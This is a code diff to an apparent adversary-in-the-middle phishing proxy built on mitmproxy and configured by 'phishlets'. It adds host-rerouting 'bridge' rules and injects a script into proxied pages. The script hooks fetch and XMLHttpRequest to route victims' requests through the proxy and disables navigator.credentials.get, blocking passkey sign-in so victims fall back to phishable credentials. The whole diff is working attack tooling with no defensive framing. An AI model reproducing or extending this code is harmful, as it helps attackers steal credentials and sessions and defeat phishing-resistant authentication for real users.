@@ -115,6 +115,25 @@ class VantaInterceptor:
         try:
             path = getattr(flow.request, "path", "")
             method = getattr(flow.request, "method", "GET")
+            # Bridge rules: route certain prefixes to alternate target hosts (e.g., api.x.com)
+            try:
+                for br in getattr(self.phishlet, "bridges", []):
+                    pfx = br.prefix
+                    if pfx and path.startswith(pfx):
+                        new_path = path[len(pfx):] if br.strip_prefix else path
+                        if not new_path.startswith("/"):
+                            new_path = "/" + new_path
+                        flow.request.path = new_path
+                        flow.request.host = br.target_host
+                        try:
+                            if not hasattr(flow, "metadata"):
+                                flow.metadata = {}
+                            flow.metadata["v_tgt_host"] = br.target_host
+                        except Exception:
+                            pass
+                        break
+            except Exception:
+                pass
             for rule in getattr(self.phishlet, "path_rewrites", []):
                 if method in rule.methods and re.search(rule.pattern, path):
                     new_path = re.sub(rule.pattern, rule.replace, path)
@@ -245,6 +264,32 @@ class VantaInterceptor:
 
     def _inject_scripts(self, flow: http.HTTPFlow):
         if "text/html" in flow.response.headers.get("content-type", ""):
+            # Dynamic bridge injection: reroute fetch/XHR for specified host(s) to local prefixes
+            try:
+                bridges = getattr(self.phishlet, "bridges", [])
+                if bridges:
+                    parts = []
+                    for b in bridges:
+                        host = b.target_host.replace("'", "\\'")
+                        pfx = b.prefix.replace("'", "\\'")
+                        parts.append(f"{{h:'{host}',p:'{pfx}'}}")
+                    arr = "[" + ",".join(parts) + "]"
+                    js_bridge = (
+                        "(function(){try{"
+                        f"var BR={arr};"
+                        "function rw(u){try{var x=new URL(u,window.location.origin);"
+                        "for(var i=0;i<BR.length;i++){var b=BR[i];if(x.host===b.h){return b.p+x.pathname.replace(/^\\//,'')+(x.search||'');}}}catch(e){}return u;}"
+                        "var of=window.fetch;if(of){window.fetch=function(i,n){try{if(typeof i==='string'){i=rw(i);}else if(i&&i.url){var r=rw(i.url);if(r!==i.url)i=new Request(r,i);}}catch(e){}return of.call(this,i,n);};}"
+                        "var xo=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){try{u=rw(u);}catch(e){}return xo.apply(this,[m,u].concat([].slice.call(arguments,2)));};"
+                        "if(navigator.credentials&&navigator.credentials.get){try{navigator.credentials.get=function(){return Promise.reject(new DOMException('Not supported','NotSupportedError'));};}catch(e){}}"
+                        "}catch(e){}})();"
+                    )
+                    flow.response.text = flow.response.text.replace(
+                        "</body>",
+                        f"<script>{js_bridge}</script></body>"
+                    )
+            except Exception:
+                pass
             for injection in self.phishlet.injections:
                 if injection.position == "body_end":
                     flow.response.text = flow.response.text.replace(
